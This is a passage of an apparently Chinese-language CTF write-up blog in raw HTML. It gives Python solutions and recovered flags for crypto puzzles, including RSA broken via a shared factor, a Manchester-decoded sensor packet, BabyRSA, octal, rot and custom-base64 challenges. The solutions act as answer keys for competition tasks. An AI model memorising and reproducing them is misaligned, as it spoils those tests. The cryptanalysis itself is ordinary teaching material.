class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c13 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n14 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c14 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n15 = <span class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c15 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c16 = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c17 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c18 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c19 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n20 = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c20 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line">list=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(list)):</span><br><span class="line">        <span class="keyword">print</span> i,j</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> (gcd(list[i],list[j]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;error &quot;</span>,i</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到第5和第18个n有最大公约数，即p</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span><br></pre></td></tr></table></figure><p>计算得到q</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527</span><br></pre></td></tr></table></figure><p>求d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="number">65537</span></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure><p>求c</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">t=p*q</span><br><span class="line">list=[c,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(list)):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span> (pow(list[i],d,t))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;error &quot;</span>,i</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="传感器"><a href="#传感器" class="headerlink" title="传感器"></a>传感器</h2><p>5555555595555A65556AA696AA6666666955</p><p>这是某压力传感器无线数据包解调后但未解码的报文(hex)</p><p>已知其ID为0xFED31F，请继续将报文完整解码，提交hex。</p><p>提示1：曼联</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;5555555595555A65556AA696AA6666666955&quot;</span></span><br><span class="line">b=int(a,<span class="number">16</span>)</span><br><span class="line">c=bin(b)[<span class="number">2</span>:]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(c),<span class="number">2</span>):</span><br><span class="line">    steady=c[i:i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> steady==<span class="string">&#x27;01&#x27;</span>:</span><br><span class="line">        flag+=str(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> steady==<span class="string">&#x27;10&#x27;</span>:</span><br><span class="line">        flag+=str(<span class="number">0</span>)</span><br><span class="line">print(hex(int(flag)))</span><br><span class="line"><span class="comment">#print十六进制</span></span><br></pre></td></tr></table></figure><p>但是与原ID不一样。尝试将二进制反转。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#最终直接转化字符串，一定要注意二进制数据是四的倍数。</span><br><span class="line">a&#x3D;&quot;5555555595555A65556AA696AA6666666955&quot;</span><br><span class="line">b&#x3D;int(a,16)</span><br><span class="line">c&#x3D;&#39;0&#39;+bin(b)[2:]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">steady_flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,len(c),4):</span><br><span class="line">steady&#x3D;c[i:i+4]</span><br><span class="line">print(steady)</span><br><span class="line">if steady&#x3D;&#x3D;&#39;0101&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;11&#39;)</span><br><span class="line">elif steady&#x3D;&#x3D;&#39;1001&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;01&#39;)</span><br><span class="line">elif steady&#x3D;&#x3D;&#39;0110&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;10&#39;)</span><br><span class="line">elif steady&#x3D;&#x3D;&#39;1010&#39;:</span><br><span class="line">flag+&#x3D;str(&#39;00&#39;)</span><br><span class="line">for i in range(0,len(flag),8):</span><br><span class="line">steady_flag+&#x3D;hex(int(flag[i:i+8][::-1],2))[2:]</span><br><span class="line">print(steady_flag)</span><br><span class="line">#采用第二种编码方式，并且需要将二进制数据每八位逆序。然后转换十六进制。</span><br></pre></td></tr></table></figure><p>最后拿到十六进制<code>fffffed31f645055f9</code>。</p><h2 id="GUET-CTF2019-BabyRSA"><a href="#GUET-CTF2019-BabyRSA" class="headerlink" title="[GUET-CTF2019]BabyRSA"></a>[GUET-CTF2019]BabyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p_and_q = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span></span><br><span class="line">p_1_q_1 = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span></span><br><span class="line">e = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219</span></span><br><span class="line">d = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span></span><br><span class="line">enc_flag = <span class="number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span></span><br><span class="line"></span><br><span class="line">n = p_1_q_1 - p_and_q - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">plain = gmpy2.powmod(enc_flag,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(plain)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="密码学的心声"><a href="#密码学的心声" class="headerlink" title="密码学的心声"></a>密码学的心声</h2><p>所有数字都小于8，考虑八进制组合，3个一组，得出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;111 114 157 166 145 123 145 143 165 162 151 164 171 126 145 162 171 115 165 143 150&#x27;</span></span><br><span class="line">tmp = [s.split(<span class="string">&#x27; &#x27;</span>)[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s.split(<span class="string">&#x27; &#x27;</span>)))]</span><br><span class="line">cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    cipher += chr(int(i,<span class="number">8</span>))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+cipher+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="rot"><a href="#rot" class="headerlink" title="rot"></a>rot</h2><p>先将数字减去13，然后在转字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&quot;</span></span><br><span class="line">steady_str=steady_str.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    flag+=str(int(i)<span class="number">-13</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    print(flag[i:i+<span class="number">2</span>])</span><br><span class="line">steady_str=<span class="string">&quot;70 76 65 71 32 73 83 32 102 108 97 103 123 119 119 119 95 115 104 105 121 97 110 98 97 114 95 99 111 109 95 105 115 95 118 101 114 121 95 103 111 111 100 95 63 63 63 63 125 10 77 68 53 58 51 56 101 52 99 51 53 50 56 48 57 101 49 53 48 49 56 54 57 50 48 97 97 99 51 55 49 57 48 99 98 99&quot;</span></span><br><span class="line">steady_list=steady_str.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_list:</span><br><span class="line">    flag+=chr(int(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLAG IS flag&#123;www_shiyanbar_com_is_very_good_????&#125;</span><br><span class="line">MD5:<span class="number">38e4</span>c352809e150186920aac37190cbc</span><br></pre></td></tr></table></figure><p>最后md5破解，拿到flag。</p><h2 id="BJDCTF2020-这是base"><a href="#BJDCTF2020-这是base" class="headerlink" title="[BJDCTF2020]这是base??"></a>[BJDCTF2020]这是base??</h2><p>base64表给换掉了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict:&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// An highlighted block</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">dict=&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>,<span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span 